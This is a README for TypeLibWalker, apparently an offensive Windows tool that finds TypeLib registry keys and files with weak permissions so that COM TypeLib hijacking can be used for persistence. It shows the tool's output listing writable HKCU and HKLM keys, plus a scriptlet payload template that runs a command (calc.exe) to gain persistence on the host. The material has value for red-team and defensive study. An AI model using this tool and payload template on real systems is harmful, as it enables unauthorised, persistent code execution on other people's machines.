# TypeLibWalker
This is a new way of persistence on Windows machines using TypeLib. Read more here:
https://medium.com/@cicada-8/hijack-the-typelib-new-com-persistence-technique-32ae1d284661

This tool performs comprehensive checks to detect potential Typelib libraries for hijacking:
- Insecure permissions on registry keys associated with TypeLib;
- Unsafe permissions on TypeLib on disk.

```shell
PS C:\Users\Michael\Downloads\TypeLibWalker-main\TypeLibWalker\x64\Debug> .\TypeLibWalker.exe
       wWWWw               wWWWw
 vVVVv (___) wWWWw         (___)  vVVVv
 (___)  ~Y~  (___)  vVVVv   ~Y~   (___)
  ~Y~   \|    ~Y~   (___)    |/    ~Y~
  \|   \ |/   \| /  \~Y~/   \|    \ |/
 \|// \|// \|/// \|//  \|// \|///  \|//
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
TypeLibWalker - find suitable TypeLibs for TypeLib Hijacking
[+] Analyzing all CLSIDs
[+] Total CLSID: 8217
----------------------------
CLSID: {00020803-0000-0000-C000-000000000046}
TypeLib: {00020802-0000-0000-C000-000000000046}
Version: 1.3
        [1] Writable: HKCU\Software\Classes\TypeLib\{00020802-0000-0000-C000-000000000046}\1.3 (Exists)
                [1.WIN64] Writable: HKCU\Software\Classes\TypeLib\{00020802-0000-0000-C000-000000000046}\1.3\0\WIN64 (Does not exist)
                [1.WIN32] Writable: HKCU\Software\Classes\TypeLib\{00020802-0000-0000-C000-000000000046}\1.3\0\WIN32 (Does not exist)
        [2] Writable: HKLM\Software\Classes\TypeLib\{00020802-0000-0000-C000-000000000046}\1.3 (Exists)
                [2.WIN64] Writable: HKLM\Software\Classes\TypeLib\{00020802-0000-0000-C000-000000000046}\1.3\0\WIN64 (Does not exist)
                [2.WIN32] Writable: HKLM\Software\Classes\TypeLib\{00020802-0000-0000-C000-000000000046}\1.3\0\WIN32 (Does not exist)
```

Once the correct registry key is found, you can prescribe a payload with commands to execute. For example:
```shell
<?xml version="1.0"?>
<scriptlet>
    <Registration
        description="CICADA8 RESEARCH"
        progid="CICADA8"
        version="1.0">
    </Registration>
    <script language="JScript">
        <![CDATA[
            var WShell = new ActiveXObject("WScript.Shell");
            WShell.Run("calc.exe");
        ]]>
    </script>
</scriptlet>
```

As a result of which you will get persistence on the host :)

![изображение](https://github.com/user-attachments/assets/5b568fc4-3055-4a02-b98c-9f8023c0b9c1)
